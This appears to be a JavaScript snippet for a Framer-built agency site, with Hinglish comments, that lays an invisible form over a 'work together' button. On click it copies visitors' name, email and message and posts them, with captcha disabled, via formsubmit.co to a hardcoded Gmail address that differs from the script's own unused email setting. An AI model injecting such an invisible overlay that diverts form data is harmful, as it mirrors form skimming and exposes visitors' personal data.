console.log("👻 Brevlo Ghost Mode Loaded");

document.addEventListener("DOMContentLoaded", () => {
    
    // Email jahan message chahiye (Apna email yahan dhyan se daalna)
    const MY_EMAIL = "opeditor5@gmail.com"; 

    // Button dhoondo
    const finder = setInterval(() => {
        const targets = document.querySelectorAll('div, button, a');
        let targetBtn = null;

        for (let el of targets) {
            // Hum wo element dhoond rahe hain jo button jaisa dikhta hai aur text match karta hai
            if (el.innerText && el.innerText.toLowerCase().includes("work together")) {
                if (el.tagName === 'BUTTON' || el.getAttribute('role') === 'button' || el.className.includes('framer')) {
                    targetBtn = el;
                    break;
                }
            }
        }

        if (targetBtn) {
            clearInterval(finder);
            console.log("🎯 Target Found. Applying Invisible Shield.");

            // Target button ko 'relative' banao taaki hum uske upar kuch chipka sakein
            targetBtn.style.position = "relative";
            targetBtn.style.zIndex = "10"; // Ensure it's clickable context

            // --- THE INVISIBLE FORM ---
            // Hum ek form banayenge jo button ke size ka hoga, par invisible
            const ghostForm = document.createElement('form');
            ghostForm.action = `https://formsubmit.co/vtoog2008@gmail.com`; // Free Service
            ghostForm.method = "POST";
            
            // CSS to make it overlay perfectly
            ghostForm.style.position = "absolute";
            ghostForm.style.top = "0";
            ghostForm.style.left = "0";
            ghostForm.style.width = "100%";
            ghostForm.style.height = "100%";
            ghostForm.style.opacity = "0"; // Invisible!
            ghostForm.style.cursor = "pointer";
            ghostForm.style.zIndex = "999"; // Sabse upar
            ghostForm.style.margin = "0";
            ghostForm.style.padding = "0";

            // Important Settings for FormSubmit
            // 1. Redirect to Thank You Page
            const nextInput = document.createElement('input');
            nextInput.type = "hidden";
            nextInput.name = "_next";
            nextInput.value = "https://brevlomedia.com/thank-you"; // Tera thank you page
            ghostForm.appendChild(nextInput);

            // 2. Subject Line
            const subjectInput = document.createElement('input');
            subjectInput.type = "hidden";
            subjectInput.name = "_subject";
            subjectInput.value = "New Lead from Brevlo Site! 🔥";
            ghostForm.appendChild(subjectInput);

            // 3. Captcha Band (Optional)
            const captchaInput = document.createElement('input');
            captchaInput.type = "hidden";
            captchaInput.name = "_captcha";
            captchaInput.value = "false"; // Captcha nahi chahiye
            ghostForm.appendChild(captchaInput);

            // --- DATA INPUTS (Hidden) ---
            // Hum asli inputs se data copy karke yahan daalenge submit ke waqt
            const nameH = document.createElement('input'); nameH.type="hidden"; nameH.name="Name";
            const emailH = document.createElement('input'); emailH.type="hidden"; emailH.name="Email";
            const msgH = document.createElement('input'); msgH.type="hidden"; msgH.name="Message";
            
            ghostForm.appendChild(nameH);
            ghostForm.appendChild(emailH);
            ghostForm.appendChild(msgH);

            // Submit Button (Invisible layer ka trigger)
            const submitBtn = document.createElement('button');
            submitBtn.type = "submit";
            submitBtn.style.width = "100%";
            submitBtn.style.height = "100%";
            submitBtn.style.border = "none";
            submitBtn.style.background = "transparent";
            ghostForm.appendChild(submitBtn);

            // --- LOGIC: Jab koi click kare, data copy karo ---
            submitBtn.addEventListener('click', () => {
                // Page ke asli inputs dhoondo
                const realName = document.querySelector('input[type="text"]')?.value || "Not Provided";
                const realEmail = document.querySelector('input[type="email"]')?.value || "Not Provided";
                const realMsg = document.querySelector('textarea')?.value || "Not Provided";

                // Hidden inputs mein data bharo
                nameH.value = realName;
                emailH.value = realEmail;
                msgH.value = realMsg;
                
                // Visual feedback (Asli button ko thoda change karo taaki feel aaye)
                targetBtn.innerText = "Sending...";
                targetBtn.style.opacity = "0.8";
            });

            // Form ko button ke andar daal do (Overlay)
            targetBtn.appendChild(ghostForm);
        }
    }, 500);
});